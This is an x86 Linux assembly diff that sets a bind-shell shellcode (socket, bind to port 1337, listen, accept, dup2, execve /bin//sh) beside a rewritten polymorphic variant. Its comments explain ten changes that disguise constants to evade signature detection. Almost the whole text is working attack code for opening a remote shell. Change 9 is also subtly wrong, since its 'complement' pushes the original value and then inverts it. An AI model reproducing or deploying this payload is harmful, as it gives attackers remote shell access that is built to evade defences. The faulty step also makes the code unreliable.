@@ -1,0 +1,102 @@
+
+
+; change 1 --------------
+push   0x66                 push	0x1
+pop    eax                  push	eax     ; push garbage
+push   0x1                  push	0x33    
+pop    ebx                  pop	eax         ; pop 0x33 to eax
+                            add	esp, 4      ; remove garbage
+                            pop	ebx         ; pop 0x1 to ebx
+                            add	eax, 0x33   ; 0x33 + eax = 0x66
+;------------------------
+
+
+xor    esi,esi
+push   esi
+push   ebx
+push   0x2
+mov    ecx,esp
+int    0x80
+
+pop    edi
+xchg   edi,eax
+xchg   ebx,eax
+mov    al,0x66
+push   esi
+
+; change 2 --------------
+push word  0x3905           push word 0xC6FA    ; compliment of 3905
+                            not word [esp]      ; change value to 0x3905
+;------------------------
+push   bx
+mov    ecx,esp
+
+; change 3 --------------
+push   0x10                 push 0xE            ; push E instead of 0x10
+	                        add	[esp], ebx      ; add 0x2 to be 0x10 again
+;------------------------
+
+push   ecx
+push   edi
+mov    ecx,esp
+int    0x80
+mov    al,0x66
+
+; change 4 --------------
+mov    bl,0x4               add	bl,0x2          ; ebx += 2
+;------------------------
+
+; change 5 --------------
+                            ; stack was  [ 7 | address ]
+                            ; zero esp+4 [ 7 | 0       ]
+push   esi                  add	esp, 4
+push   edi                  mov	dword [esp], edx    ; edx is 0
+                            sub	esp, 4
+;------------------------
+
+mov    ecx,esp
+int    0x80
+mov    al,0x66
+inc    ebx
+
+; change 6 --------------                  
+                            ; stack was  [ 7 | 0 | 0x10 ]
+                            ; zero esp+8 [ 7 | 0 | 0    ]
+push   esi                  add	esp, 8
+push   esi                  mov	dword [esp], edx	; make it 0
+push   edi                  sub	esp, 8
+;------------------------
+
+mov    ecx,esp
+int    0x80
+
+; change 7 --------------
+pop    ecx                  xor ecx, ecx        ; eax = 0
+pop    ecx                  mul ecx             ; eax = 0 and edx = 0
+mov    cl,0x2              
+xchg   ebx,eax              ; no need because eax become 0
+;------------------------
+loop:
+mov    al,0x3f
+int    0x80
+
+; change 8 --------------
+dec    ecx                  ; no need, loop instruction will dec ecx
+jns    loop                 loop	loop
+;------------------------
+mov    al,0xb
+
+; change 9 --------------
+push   0x68732f2f           push 0x68732F2F		; compliment of 0x68732f2f
+                            not	dword [esp]
+push   0x6e69622f           push 0x5D58511E		; 0x5D58511E + 0x11111111 = 0x6e69622f
+                            add	dword [esp], 0x11111111
+;------------------------
+mov    ebx,esp
+
+; change 10 -------------
+inc    ecx                  ; no need just make ecx = edx which is 0
+mov    edx,ecx              mov	ecx,edx
+;------------------------
+
+int    0x80
